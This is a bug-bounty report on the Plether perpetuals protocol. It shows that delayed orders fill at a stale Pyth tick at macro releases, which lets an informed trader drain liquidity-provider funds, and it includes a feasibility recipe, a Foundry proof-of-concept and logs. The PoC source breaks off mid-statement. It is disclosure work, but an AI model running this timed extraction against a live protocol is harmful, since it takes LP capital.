# \#97906 [SC-Critical] Delayed orders fill at a stale Pyth tick at macro releases: repeatable, net-profitable LP extraction

**Submitted on Nov 3rd 2026 at 20:21:22 UTC by @Mclovin for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97906
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

**Severity:** Critical  **Commit:** a82d4fefb02768e5b3bddcc97dee371eee24fea8

**Impact (program list):** Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Brief / Intro

A delayed order fills at the first Pyth tick published after its commit second, with no minimum delay. At scheduled
US macro releases (8:30 New York) that tick still carries the pre-release price; Pyth FX shows the release one to three
seconds later. A trader who has the release headline commits inside the release second, is filled at the stale price,
and closes a few seconds later at the post-release price. LP capital in `HousePool` pays the move. The steps are
ordinary public calls (`commitOrder`; any keeper's `executeOrder`), and no privileged role, oracle manipulation or
sequencer misbehaviour is involved.

**The release-second staleness is systematic, not a coincidence.**
- On all five 12:30 UTC releases in September-October 2026 with a move of 5 bps or more, the Pyth tick for the second
  after the release equals the pre-release tick, and the move prints at T+2/T+3.
- On the 36 ordinary weekdays in that period, the same second moves at most 2.8 bps.
- Replaying the real ticks of three releases through the production order path nets the attacker +1,252.60 to
  +3,404.53 USDG per release on a 2.40M USDG position, and LPs lose 2,213.00 to 4,364.89 USDG.
- The same trade committed two seconds later loses money every time.

**The protocol's own design source says this delay is far too short.** The whitepaper calls delayed settlement "a
recognized defense against oracle latency exploitation" and cites Synthetix SIP-285 for it. SIP-285 measured Pyth at
"about 1 second of latency relative to Binance" (2022, crypto feeds), and for that reason sets the settlement delay
threshold at "12 seconds initially … an average realized delay of 6 seconds". Plether's delay is under one second.

**Relation to the known issue HIGH-1.** The program lists Cecuro HIGH-1 (Arbitrum and Pyth clock alignment) and states:
"A new report on this root cause is valid only with a proof of concept showing a repeatable, net-profitable
extraction from LPs beyond this limitation." The client's severity adjustment in the Cecuro report reads: "the next
tick is unknown and could favor either side. A higher severity would require evidence that the timing window is usable
and gives traders an exploitable pricing advantage at LP expense." This report is that evidence, and it does not depend
on HIGH-1's precondition:
- HIGH-1 needs the sequencer clock to trail Pyth so that an already-published tick qualifies.
- Here the clocks can be perfectly aligned. Pyth's own metadata for the fill tick on all three replayed releases
  (`prev_publish_time = T`, `proof_available_time = T+1`) shows it did not exist during the commit second.
- The next tick is not unknown: at releases it is predictably stale, and it favours the informed side.

## Vulnerability Details

1. **The fill is the first tick after the commit second, and nobody can choose another.** `OrderLifecycleBook` stamps
   `commitTimestamp: uint64(block.timestamp)` (OrderLifecycleBook.sol:294). `PletherOracle._resolveHistoricalOrderBasket`
   sets `minPublishTime = request.commitTime + 1` and calls `pyth.parsePriceFeedUpdatesUnique(data, ids,
   minPublishTime, min(commitTime + orderSettlementWindow, block.timestamp))` (PletherOracle.sol:610-616;
   `orderSettlementWindow = 15`, :87). Uniqueness (`prevPublishTime < minPublishTime`) makes the oracle take exactly
   the first update after the commit second, whatever the keeper supplies. There is no minimum delay.
   - The PoC asserts the oracle picked T+1 in all three attack tests (`engine.lastMarkTime() == T + 1`). The keeper's
     payloads always contain ticks from T−2 to T+5.
   - A keeper installing the post-release T+3 mark before execution leaves the fill unchanged: entry prices
     97,398,257 and 99,452,880 with and without the refresh.
2. **At scheduled releases that tick is stale.** Pyth Benchmarks returns one FX update per second, each with
   `prev_publish_time = publish_time − 1`. At releases the update for second T+1 still carries the pre-release price
   (data below), and the move appears at T+2/T+3.
3. **No other control intervenes.**
   - Binding orders and FIFO only fix the tick; they don't delay it.
   - The 10-bps basket confidence gate (PletherOracle.sol:869-873) passes the calm T+1 tick (basket confidence
     0.6-1.0 bps).
   - The T+2 tick is rejected by the gate on both payroll days (12.4 and 14.1 bps on the two-feed floor). On the three
     other releases it passes (3.4-5.4 bps), but it already carries most of the move (e.g. −10.2 of −15.3 bps on 09-11).
     So the edge belongs to a commit inside the release second.
4. **The exit is an ordinary close.** A full close committed seconds later fills at the post-release tick. VPI paid at
   open is refunded at close (lifetime clamp), so the round trip costs two 4-bps execution fees, a sub-bp confidence
   shift and a sub-bp VPI residual.

### Documented claims this disproves (in-scope documentation)

- WHITEPAPER.md:1004-1006: "Delayed settlement is a recognized defense against oracle latency exploitation, while
  finite settlement windows limit the option value given to the trader [5,15]." Reference [15] is SIP-285 (above).
- WHITEPAPER.md:1893-1894: "Delayed execution reduces the advantage from oracle latency."
- SECURITY.md:658-659: "binding order semantics and the lack of a user cancellation path prevent traders from turning
  queued intents into free options". A commit inside the release second is such an option: the price is fixed before
  the information reaches the oracle, and the direction is already known.
- Cecuro HIGH-1, client severity adjustment: "the next tick is unknown and could favor either side".

## Evidence (real data)

**Pyth Benchmarks, EUR/USD and USD/JPY** (57.6% + 13.6% of the basket). Basket = Plether's formula, with the other four
components at their base prices:

| Release, 12:30:00 UTC | EUR/USD at T | EUR/USD at T+1 (fill) | T+1 update (Pyth metadata) | basket T+1 → T+4 |
|---|---|---|---|---|
| 2026-09-04 payrolls | 1.16263 | 1.16263 | publish T+1, prev T, proof_available T+1 | −22.5 bps |
| 2026-09-11 CPI | 1.15968 | 1.15975 | publish T+1, prev T, proof_available T+1 | −15.3 bps |
| 2026-10-02 payrolls | 1.12331 | 1.12331 | publish T+1, prev T, proof_available T+1 | +15.7 bps |
| 2026-10-14 (12:30 UTC release) | (census) | stale (Δ 0.16 bps vs T) | — | −14.9 bps |
| 2026-10-15 (12:30 UTC release) | (census) | stale (Δ 0.34 bps vs T) | — | −6.7 bps |

Census of every weekday 12:30:00 UTC from 2026-09-01 to 2026-10-30: these five are the only seconds with a move of 5 bps
or more. On the 36 other days with data, the move T+1 → T+4 is at most 2.8 bps, and at most 0.5 bps on 33 of them. Four
days returned no data from the API, including 10-02, which was fetched separately.

**Public millisecond FX ticks (Dukascopy datafeed, all six basket pairs).**
- At +1,000 ms EUR/USD is still at the pre-release price on all five days.
- EUR/USD jumps at about +1.27 s (09-04), +1.31 s (09-11), +1.41 s (10-02), +1.37-1.58 s (10-14) and +1.29 s (10-15).
- The six-pair move by +2 s is −26.2 / −17.8 / +21.3 / −15.8 / −5.7 bps.
- Two consequences:
  - the shock is USD-wide; the two-feed figures understate the basket move on four of the five releases (ratio
    1.06-1.36×; 0.85× on 10-15);
  - aggregated retail feeds lag the release much as Pyth does, so the attacker's input is the headline itself (see
    Feasibility), not a visible price.

**Arbitrum clock.** We read 979 on-chain Pyth updates on Arbitrum One. They were all crypto feeds: no update for the six
FX feeds appeared in the ten sampled windows. `publishTime − block.timestamp` ∈ {−2, −1, 0}, never ≥ 1, so in this
sample no block timestamp trailed an already-published Pyth tick, i.e. HIGH-1's precondition did not occur. The
finding needs no skew. A trailing clock would only stamp the commit earlier, and the order would still fill at a
pre-release tick.

## Impact

Each scheduled release lets an informed trader take the release move on up to 40% of pool depth (the skew cap) at a
price fixed before the move. LPs are the counterparty, so the move is paid out of `HousePool` LP capital. Measured on
real ticks at 2.40M USDG notional (30% of an 8M USDG pool):

| Release | Attacker net (USDG) | LPs (USDG) | Treasury fees (USDG) |
|---|---|---|---|
| 2026-10-02 payrolls, SHORT | +1,983.84 | −2,944.35 | 960.31 |
| 2026-09-04 payrolls, LONG | +3,404.53 | −4,364.89 | 960.16 |
| 2026-09-11 CPI, LONG | +1,252.60 | −2,213.00 | 960.20 |
| Same three, other four feeds moving with EUR/USD (USD-wide shock) | +3,691.39 / +5,479.25 / +2,476.33 | −4,651.89 / −6,439.61 / −3,436.77 | ~960 |
| Control: same trade committed at T+2 (fill T+3) | −1,704.09 / −1,929.16 / −2,196.10 | +742.11 / +970.94 / +1,237.09 | ~960 |

Plether's `LONG` profits when the basket price falls (USD strengthens) and `SHORT` when it rises (CfdTypes.sol:14).

**Size.**
- Per release, LPs lose 2.8-8.0 bps of total LP NAV at 30% skew use. With about two large releases a month, that is
  roughly 0.7-2% of LP NAV per year. It repeats at every release, and no position is held longer than about ten seconds.
- Projection (linear in depth, not a measurement): at the release Senior cap (40M Senior at the 80% share, so about 50M
  of LP capital) and the same 30% skew use, LPs would lose about 13.8k-27.3k USDG per release on the two-feed figures,
  or about 21.5k-40.2k with the USD-wide move.

**Attacker risk is bounded.**
- A misread headline costs the move plus two fees, and the attacker can trade only clear surprises.
- A commit that slips into the next second meets a T+2 tick that is either gated (no fill) or already moved.
- Wide confidence on the unseen components at T+1 means no fill (tested).

## Feasibility (what a real attacker needs)

- **The headline within about half a second of 8:30:00.000 New York.** The release schedule is public, and the Bureau of
  Labor Statistics publishes at 8:30:00. Commercial machine-readable economic-data feeds, standard for FX trading
  desks, deliver the number within milliseconds (industry practice; not measured here). Free retail price feeds are
  not fast enough: Dukascopy shows the move only at about +1.3 s.
- **One transaction in an Arbitrum block stamped with the release second.**
  - Blocks are 250 ms apart.
  - A normal transaction waits 200 ms under Timeboost; an express-lane bid removes that wait.
  - The commit needs no oracle data.
  - That leaves roughly 0.5-0.7 s after the headline.
- **Nothing else.**
  - Any keeper executes the open, and its fill price is fixed by the contract. The protocol's own keeper executes
    queued orders in normal operation; the attacker can also run its own keeper with a commercial Pyth data
    subscription.
  - The close is an ordinary order.
  - Capital is margin (the PoC posts 1% of notional; the minimum is 0.2%) plus the VPI that is refunded at close and the
    fees: about 30k USDG for the 2.4M position above.

The program states that feasibility limitations "do not change the impact or severity of a finding, only the amount
paid for it".

## Scope and rules

- **Assets.**
  - Root cause: `PletherOracle.sol` and `OrderLifecycleBook.sol`, under the asset "All other contracts, libraries,
    router contracts and interfaces in packages/perps/src". Neither is one of the six excluded view contracts.
  - Funds lost: LP USDG held by `HousePool.sol` (asset "HousePool.sol - Holds active LP USDG").
- **"Incorrect data supplied by third party oracles."** Not applicable.
  - Every price used is Pyth's correct aggregate for its publish second.
  - The defect is Plether's settlement rule, which fixes the fill to a tick taken before release information can reach
    the oracle.
  - The whitepaper itself names oracle latency as the risk that delayed settlement is meant to defend against.
- **Privileged or compromised roles (admin, operator, sequencer, prover, guardian, governance).** None.
  - The sequencer behaves honestly, and the keeper is unrelated.
  - The PoC's one owner action, the documented 72-hour oracle rotation in `setUp`, only installs the release 6-feed
    oracle configuration. The shared test base deploys a 2-feed oracle; the release deployment uses the 6-feed oracle
    from the start.
- **Known issues.**
  - **HIGH-1:** its stated condition is met, and the mechanism is distinct (above).
  - **SECURITY.md:709-712** says "The implementation adds no fixed delay to compensate for this clock mismatch." That
    sentence addresses the clock mismatch. It does not say settlement may fill at a tick that is predictably stale with
    the clocks aligned, and the program's HIGH-1 entry makes a repeatable, net-profitable LP-extraction PoC valid on
    this root cause.
  - **Pre-audit SC-M4** ("Risk Free Option in 60Sec Oracle Window", marked fixed) concerned a keeper choosing a tick
    inside a 60 s window. The rule that replaced the window is the first-unique-tick parse now in
    `_resolveHistoricalOrderBasket`. To the extent triage maps this report to SC-M4, it shows that the fix at commit
    a82d4fefb02768e5b3bddcc97dee371eee24fea8 is incomplete: at scheduled releases the first unique tick is stale.
  - No finding in the Cecuro, AI-scan, pre-audit, collaborative or Cantina reports, and no line in SECURITY.md,
    ACCOUNTING_SPEC.md or ORACLE_SYNCHRONIZATION.md, mentions releases, news or Pyth aggregation lag.
- **Not economic, liquidity or Sybil.** Single account, ordinary order sizes, and no market manipulation: the attacker
  moves no price.
- **Testing.** Local only.
  - Price history was read from Pyth's Benchmarks API (GET requests with an API key) and Dukascopy's public files.
  - The Arbitrum clock check used read-only `eth_getLogs` on a public RPC.
  - No transaction was sent to any network, oracle or third-party contract.

## Recommendation

Enforce a minimum settlement delay: fill at the first unique tick with `publishTime ≥ commitTime + minDelay`, i.e. set
`minPublishTime = commitTime + minDelay` in `_resolveHistoricalOrderBasket`.
- Choose `minDelay` above Pyth's FX release lag. The data shows at least 3 s; SIP-285's 12-second threshold is the
  conservative reference.
- Optionally also add a governance-configured release window (the calendar already supports UTC-day overrides) during
  which opens are held or charged a release spread.

## Classification

- Bug class: oracle latency arbitrage. The settlement delay is shorter than the oracle's lag behind scheduled public
  information.
- Who can exploit it: any unprivileged trader with a real-time economic-data feed.
- Not required: keeper role, owner or guardian action, oracle manipulation, mempool access, sequencer clock skew.


## Proof of Concept

## Proof of Concept

Save the source below as `packages/perps/test/fresh/lead/NewsTickLag.t.sol`. From `packages/perps`:

```
FOUNDRY_FFI=false FOUNDRY_TEST=test/fresh/lead forge test --match-contract NewsTickLagTest -vv
```

(`FOUNDRY_TEST` limits compilation to this test and its imports; a plain `forge test --match-contract NewsTickLagTest
-vv` also works but compiles the whole suite under `via_ir`.)

**Setup.**
- Release engine risk parameters: repo-root `script/DeployPerpsArbitrumSepolia.s.sol:434-446`. These match the release
  parameters in DEPLOYMENT.md.
- The release 6-feed basket: feed ids, quantities, bases and inversions from the same script, with the release wrapper's
  `adverseConfidenceMultiplierBps = 2500` and the 10-bps confidence gate.
- Senior capacity 40M / 80%. LPs (6M Senior, 2M Junior) fund the day before the release.
- The chain clock is set to the real release timestamps, so the market calendar is live.
- `MockPyth` explicit payloads carry the real per-second EUR/USD and USD/JPY updates for T−2..T+8: price, confidence,
  exponent, and `prev = publish − 1` as in Pyth's metadata. The oracle's own unique parse selects the fill tick; the
  test never picks it.
- An unrelated `KEEPER` executes every order; the attacker only commits.

**Tests** (13/13 pass):

| Test | Shows |
|---|---|
| `test_Attack_{Oct02,Sep04,Sep11CPI}_CommitInReleaseSecond` | commit at T, fill at T+1 (asserted), net profit, LP loss |
| `test_Control_{Oct02,Sep04,Sep11CPI}_CommitAfterPythShowsMove` | the same trade committed at T+2 fills at T+3 and loses |
| `test_Robust_{Oct02,Sep04}_KeeperRefreshAtT3First` | a keeper installs the T+3 mark first: same stale fill, same profit |
| `test_Scenario_{Oct02,Sep04,Sep11CPI}_OthersFollowEur` | GBP, CAD, SEK and CHF move with EUR/USD (USD-wide shock): larger profit |
| `test_Sensitivity_Oct02_OthersConf25bpsAtFill` | the four unseen feeds at 25 bps confidence at T+1 (about 25× normal): still fills |
| `test_Sensitivity_Oct02_OthersConf40bpsAtFill_NoFill` | at 40 bps the gate rejects the tick: no fill, no loss |

**Output of the final run (13/13 pass):**

```text
Ran 13 tests for test/fresh/lead/NewsTickLag.t.sol:NewsTickLagTest
[PASS] test_Attack_Oct02_CommitInReleaseSecond() (gas: 7134812)
Logs:
  ATTACK 2026-10-02 SHORT committed at T (12:30:00)
    notional (USDG atoms) 2400576290037
    entry price (8 dec) 97398257
    engine mark publish time after open 1790944201
    attacker net (USDG atoms)
  1983843680
    LP pool accounted delta (USDG atoms)
  -2944351534
    treasury fees (USDG atoms) 960307854
    -- after open: treasury 960307854
       attacker clearinghouse delta / LP delta after open:
  -4561916782
  3601408928
    exit mark (8 dec) 97559050

[PASS] test_Attack_Sep04_CommitInReleaseSecond() (gas: 7132016)
Logs:
  ATTACK 2026-09-04 LONG committed at T (12:30:00)
    notional (USDG atoms) 2400545054824
    entry price (8 dec) 99452880
    engine mark publish time after open 1788525001
    attacker net (USDG atoms)
  3404527207
    LP pool accounted delta (USDG atoms)
  -4364885091
    treasury fees (USDG atoms) 960157884
    -- after open: treasury 960157884
       attacker clearinghouse delta / LP delta after open:
  -4560642045
  3600284161
    exit mark (8 dec) 99229148

[PASS] test_Attack_Sep11CPI_CommitInReleaseSecond() (gas: 7132865)
Logs:
  ATTACK 2026-09-11 CPI LONG committed at T (12:30:00)
    notional (USDG atoms) 2400508048800
    entry price (8 dec) 99498347
    engine mark publish time after open 1789129801
    attacker net (USDG atoms)
  1252602471
    LP pool accounted delta (USDG atoms)
  -2213001318
    treasury fees (USDG atoms) 960198847
    -- after open: treasury 960198847
       attacker clearinghouse delta / LP delta after open:
  -4560990212
  3600591365
    exit mark (8 dec) 99363921

[PASS] test_Control_Oct02_CommitAfterPythShowsMove() (gas: 7156417)
Logs:
  CONTROL 2026-10-02 SHORT committed at T+2
    notional (USDG atoms) 2400576290037
    entry price (8 dec) 97547776
    engine mark publish time after open 1790944203
    attacker net (USDG atoms)
  -1704091453
    LP pool accounted delta (USDG atoms)
  742109401
    treasury fees (USDG atoms) 961782052
    -- after open: treasury 961782052
       attacker clearinghouse delta / LP delta after open:
  -4574456730
  3612474678
    exit mark (8 dec) 97559050

[PASS] test_Control_Sep04_CommitAfterPythShowsMove() (gas: 7161596)
Logs:
  CONTROL 2026-09-04 LONG committed at T+2
    notional (USDG atoms) 2400545054824
    entry price (8 dec) 99231142
    engine mark publish time after open 1788525003
    attacker net (USDG atoms)
  -1929156888
    LP pool accounted delta (USDG atoms)
  970939751
    treasury fees (USDG atoms) 958017137
    -- after open: treasury 958017137
       attacker clearinghouse delta / LP delta after open:
  -4542464963
  3584247826
    exit mark (8 dec) 99229148

[PASS] test_Control_Sep11CPI_CommitAfterPythShowsMove() (gas: 7162850)
Logs:
  CONTROL 2026-09-11 CPI LONG committed at T+2
    notional (USDG atoms) 2400508048800
    entry price (8 dec) 99354914
    engine mark publish time after open 1789129803
    attacker net (USDG atoms)
  -2196099774
    LP pool accounted delta (USDG atoms)
  1237085112
    treasury fees (USDG atoms) 958814662
    -- after open: treasury 958814662
       attacker clearinghouse delta / LP delta after open:
  -4549232561
  3590217899
    exit mark (8 dec) 99363921

[PASS] test_Robust_Oct02_KeeperRefreshAtT3First() (gas: 7269313)
Logs:
  ROBUST 2026-10-02 SHORT, keeper refreshed mark at T+3 before the open executed
    notional (USDG atoms) 2400576290037
    entry price (8 dec) 97398257
    engine mark publish time after open 1790944203
    attacker net (USDG atoms)
  1983843680
    LP pool accounted delta (USDG atoms)
  -2944351534
    treasury fees (USDG atoms) 960307854
    -- after open: treasury 960307854
       attacker clearinghouse delta / LP delta after open:
  -4561916782
  3601408928
    exit mark (8 dec) 97559050

[PASS] test_Robust_Sep04_KeeperRefreshAtT3First() (gas: 7266430)
Logs:
  ROBUST 2026-09-04 LONG, keeper refreshed mark at T+3 before the open executed
    notional (USDG atoms) 2400545054824
    entry price (8 dec) 99452880
    engine mark publish time after open 1788525003
    attacker net (USDG atoms)
  3404527207
    LP pool accounted delta (USDG atoms)
  -4364885091
    treasury fees (USDG atoms) 960157884
    -- after open: treasury 960157884
       attacker clearinghouse delta / LP delta after open:
  -4560642045
  3600284161
    exit mark (8 dec) 99229148

[PASS] test_Scenario_Oct02_OthersFollowEur() (gas: 7169864)
Logs:
  SCENARIO 2026-10-02 SHORT, other four feeds follow EUR/USD
    notional (USDG atoms) 2400526844143
    entry price (8 dec) 97398257
    engine mark publish time after open 1790944201
    attacker net (USDG atoms)
  3691385388
    LP pool accounted delta (USDG atoms)
  -4651893242
    treasury fees (USDG atoms) 960307854
    -- after open: treasury 960307854
       attacker clearinghouse delta / LP delta after open:
  -4561916782
  3601408928
    exit mark (8 dec) 97628355

[PASS] test_Scenario_Sep04_OthersFollowEur() (gas: 7168264)
Logs:
  SCENARIO 2026-09-04 LONG, other four feeds follow EUR/USD
    notional (USDG atoms) 2400581403640
    entry price (8 dec) 99452880
    engine mark publish time after open 1788525001
    attacker net (USDG atoms)
  5479251720
    LP pool accounted delta (USDG atoms)
  -6439609604
    treasury fees (USDG atoms) 960157884
    -- after open: treasury 960157884
       attacker clearinghouse delta / LP delta after open:
  -4560642045
  3600284161
    exit mark (8 dec) 99142967

[PASS] test_Scenario_Sep11CPI_OthersFollowEur() (gas: 7166999)
Logs:
  SCENARIO 2026-09-11 CPI LONG, other four feeds follow EUR/USD
    notional (USDG atoms) 2400571815513
    entry price (8 dec) 99498347
    engine mark publish time after open 1789129801
    attacker net (USDG atoms)
  2476329398
    LP pool accounted delta (USDG atoms)
  -3436768045
    treasury fees (USDG atoms) 960238647
    -- after open: treasury 960238647
       attacker clearinghouse delta / LP delta after open:
  -4561328501
  3600889854
    exit mark (8 dec) 99313072

[PASS] test_Sensitivity_Oct02_OthersConf25bpsAtFill() (gas: 7151645)
Logs:
  SENSITIVITY 2026-10-02 SHORT, other four feeds at 25 bps confidence at T+1
    notional (USDG atoms) 2400576290037
    entry price (8 dec) 97412100
    engine mark publish time after open 1790944201
    attacker net (USDG atoms)
  1642491087
    LP pool accounted delta (USDG atoms)
  -2603135428
    treasury fees (USDG atoms) 960444341
    -- after open: treasury 960444341
       attacker clearinghouse delta / LP delta after open:
  -4563077062
  3602432721
    exit mark (8 dec) 97559050

[PASS] test_Sensitivity_Oct02_OthersConf40bpsAtFill_NoFill() (gas: 3894220)
Suite result: ok. 13 passed; 0 failed; 0 skipped; finished in 30.95ms (207.67ms CPU time)
```

**Full PoC source (`packages/perps/test/fresh/lead/NewsTickLag.t.sol`):**

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @dev Same wrapper as script/DeployPerpsArbitrumSepolia.s.sol:87-100 (release oracle: adverse multiplier 2500).
contract ReleaseOracleForTest is PletherOracle {

    constructor(
        address engine,
        address housePool,
        address pyth,
        bytes32[] memory feedIds,
        uint256[] memory quantities,
        uint256[] memory basePrices,
        bool[] memory inversions
    ) PletherOracle(engine, housePool, pyth, feedIds, quantities, basePrices, inversions) {
        adverseConfidenceMultiplierBps = 2500;
    }

}

/// @notice Stale Pyth fill tick at scheduled macro releases. Delayed orders fill at the first Pyth tick whose
///         publishTime > commitTime (PletherOracle.sol:610, commitTime = block.timestamp at commit,
///         OrderLifecycleBook.sol:294). At scheduled US macro releases (8:30 New York) the Pyth FX tick for
///         release-second + 1 is still the pre-release price; the move prints one to three seconds later. A trader who
///         commits inside the release second (direction known from the headline) is filled at the stale tick and
///         exits seconds later at LP expense.
///         Price data = REAL Pyth Benchmarks ticks for EUR/USD and USD/JPY (57.6% + 13.6% of the basket) around the
///         2026-09-04 and 2026-10-02 payroll releases and the 2026-09-11 CPI release. GBP/CAD/SEK/CHF (28.8%) are held
///         constant at their base prices unless a scenario test says otherwise (the authors' Pyth key is not entitled to
///         them); holding them constant UNDERSTATES the basket move in a USD-wide shock.
///         Release config: production risk params, the deploy script's 6-feed basket (ids, quantities, bases,
///         inversions; installed in setUp through the documented oracle rotation only because the shared test base
///         deploys a 2-feed oracle), release adverse multiplier 2500, confidence gate 10 bps. MockPyth applies Pyth's
///         uniqueness rule (prev < min <= publish <= max), and every execution payload deliberately contains several
///         consecutive real ticks: the oracle, not the test, picks the fill tick. The keeper is an unrelated address;
///         the attacker only commits.
contract NewsTickLagTest is BasePerpTest {

    // ------------------------------------------------------------------ release basket (deploy script :147-166)
    bytes32 internal constant ID_EUR = 0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
    bytes32 internal constant ID_JPY = 0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
    bytes32 internal constant ID_GBP = 0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
    bytes32 internal constant ID_CAD = 0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
    bytes32 internal constant ID_SEK = 0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
    bytes32 internal constant ID_CHF = 0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;

    // Constant components at their base prices (expo -5), ~1 bp confidence.
    int64 internal constant GBP_PX = 134_480; // 1.34480 GBP/USD
    int64 internal constant CAD_PX = 137_212; // 1.37212 USD/CAD = 1 / 0.7288
    int64 internal constant SEK_PX = 920_810; // 9.20810 USD/SEK = 1 / 0.1086
    int64 internal constant CHF_PX = 79_302; // 0.79302 USD/CHF = 1 / 1.261

    address internal constant SENIOR_LP = address(0x5E01);
    address internal constant JUNIOR_LP = address(0x1E01);
    address internal constant ATTACKER = address(0xA77A);
    address internal constant KEEPER = address(0xBEEF);

    // ------------------------------------------------------------------ real ticks, index i = second T + (i - 2)
    // OCT: T = 1790944200 = 2026-10-02 12:30:00 UTC (8:30 EDT, September payrolls), Pyth Benchmarks, EUR expo -5, JPY -3
    uint256 internal constant OCT_T = 1_790_944_200;
    int64[15] internal OCT_EUR = [int64(112323), int64(112326), int64(112331), int64(112331), int64(112536), int64(112572), int64(112582), int64(112602), int64(112601), int64(112574), int64(112541), int64(112516), int64(112495), int64(112470), int64(112428)];
    uint64[15] internal OCT_EUR_CONF = [uint64(4), uint64(5), uint64(9), uint64(11), uint64(207), uint64(20), uint64(31), uint64(13), uint64(15), uint64(10), uint64(9), uint64(13), uint64(11), uint64(14), uint64(20)];
    int64[15] internal OCT_JPY = [int64(157571), int64(157563), int64(157547), int64(157549), int64(157274), int64(157210), int64(157204), int64(157200), int64(157195), int64(157215), int64(157332), int64(157339), int64(157359), int64(157354), int64(157393)];
    uint64[15] internal OCT_JPY_CONF = [uint64(24), uint64(17), uint64(21), uint64(22), uint64(224), uint64(99), uint64(28), uint64(18), uint64(16), uint64(24), uint64(26), uint64(25), uint64(17), uint64(16), uint64(30)];
    // SEP: T = 1788525000 = 2026-09-04 12:30:00 UTC (8:30 EDT, August payrolls)
    uint256 internal constant SEP_T = 1_788_525_000;
    int64[15] internal SEP_EUR = [int64(116269), int64(116267), int64(116263), int64(116263), int64(116191), int64(115924), int64(115919), int64(115921), int64(115915), int64(115911), int64(115887), int64(115880), int64(115880), int64(115905), int64(115903)];
    uint64[15] internal SEP_EUR_CONF = [uint64(3), uint64(4), uint64(6), uint64(8), uint64(219), uint64(27), uint64(25), uint64(14), uint64(14), uint64(12), uint64(16), uint64(11), uint64(8), uint64(6), uint64(10)];
    int64[15] internal SEP_JPY = [int64(156022), int64(156033), int64(156039), int64(156039), int64(156198), int64(156619), int64(156672), int64(156692), int64(156669), int64(156666), int64(156695), int64(156691), int64(156641), int64(156625), int64(156562)];
    uint64[15] internal SEP_JPY_CONF = [uint64(30), uint64(23), uint64(24), uint64(25), uint64(379), uint64(204), uint64(43), uint64(28), uint64(30), uint64(32), uint64(25), uint64(32), uint64(21), uint64(45), uint64(40)];

    // CPI: T = 1789129800 = 2026-09-11 12:30:00 UTC (8:30 EDT, August CPI)
    uint256 internal constant CPI_T = 1_789_129_800;
    int64[15] internal CPI_EUR = [int64(115969), int64(115968), int64(115968), int64(115975), int64(115820), int64(115764), int64(115748), int64(115769), int64(115770), int64(115752), int64(115746), int64(115749), int64(115747), int64(115747), int64(115790)];
    uint64[15] internal CPI_EUR_CONF = [uint64(7), uint64(6), uint64(11), uint64(16), uint64(61), uint64(23), uint64(7), uint64(18), uint64(13), uint64(6), uint64(6), uint64(3), uint64(6), uint64(5), uint64(17)];
    int64[15] internal CPI_JPY = [int64(153918), int64(153928), int64(153932), int64(153928), int64(154212), int64(154339), int64(154383), int64(154272), int64(154334), int64(154399), int64(154415), int64(154386), int64(154358), int64(154375), int64(154293)];
    uint64[15] internal CPI_JPY_CONF = [uint64(22), uint64(12), uint64(16), uint64(20), uint64(261), uint64(156), uint64(57), uint64(95), uint64(36), uint64(28), uint64(24), uint64(32), uint64(28), uint64(20), uint64(57)];

    // Scenario switches (each test runs on a fresh state).
    bool internal othersFollowEur; // GBP/CAD/SEK/CHF move vs USD like EUR does from T+1 (USD-wide shock, stale at T+1)
    uint256 internal othersConfAtFillBps; // confidence of the four other feeds at the T+1 fill tick (0 = ~1 bp)
    bool internal keeperRefreshAtT3; // an unrelated keeper installs the T+3 mark before the open executes

    struct Series {
        uint256 T;
        int64[15] eur;
        uint64[15] eurConf;
        int64[15] jpy;
        uint64[15] jpyConf;
    }

    struct Outcome {
        int256 attackerNet;
        int256 lpDelta;
        uint256 treasuryFees;
        uint256 notional;
        uint256 entryPrice;
        uint64 openFillPublishTime;
        uint256 treasuryAfterOpen;
        int256 attackerAfterOpen;
        int256 lpAfterOpen;
        uint256 exitMark;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        // DeployPerpsArbitrumSepolia.s.sol lines 434-446 (release engine riskParams)
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0; // LPs fund the day before the release (no multi-year coupon accrual on test capital)
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        // Documented owner action: rotate the Router oracle to the release 6-feed basket (72 h timelock).
        bytes32[] memory ids = new bytes32[](6);
        (ids[0], ids[1], ids[2], ids[3], ids[4], ids[5]) = (ID_EUR, ID_JPY, ID_GBP, ID_CAD, ID_SEK, ID_CHF);
        uint256[] memory q = new uint256[](6);
        (q[0], q[1], q[2], q[3], q[4], q[5]) = (576e15, 136e15, 119e15, 91e15, 42e15, 36e15);
        uint256[] memory b = new uint256[](6);
        (b[0], b[1], b[2], b[3], b[4], b[5]) = (117_500_000, 638_000, 134_480_000, 72_880_000, 10_860_000, 126_100_000);
        bool[] memory inv = new bool[](6);
        (inv[0], inv[1], inv[2], inv[3], inv[4], inv[5]) = (false, true, false, true, true, true);
        ReleaseOracleForTest o =
